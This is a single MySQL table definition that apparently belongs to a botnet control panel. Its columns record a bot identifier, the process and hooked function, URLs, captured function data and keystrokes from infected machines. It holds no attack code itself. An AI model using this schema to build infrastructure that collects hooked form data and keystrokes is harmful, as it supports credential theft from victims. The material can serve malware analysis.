CREATE TABLE IF NOT EXISTS `rep2_` ( 
 `id` bigint(20) unsigned NOT NULL auto_increment, 
 `bot_guid` varchar(40) NOT NULL, 
 `process_name` varchar(270) NOT NULL, 
 `hooked_func` varchar(100) NOT NULL,  
 `url` varchar(2112) NOT NULL, 
 `func_data` varchar(333000) NOT NULL, 
 `keys` varchar(10000) character set ucs2 collate ucs2_bin default NULL, 
 `date_rep` datetime NOT NULL, 
 PRIMARY KEY  (`id`) 
 ) ENGINE=MyISAM ;
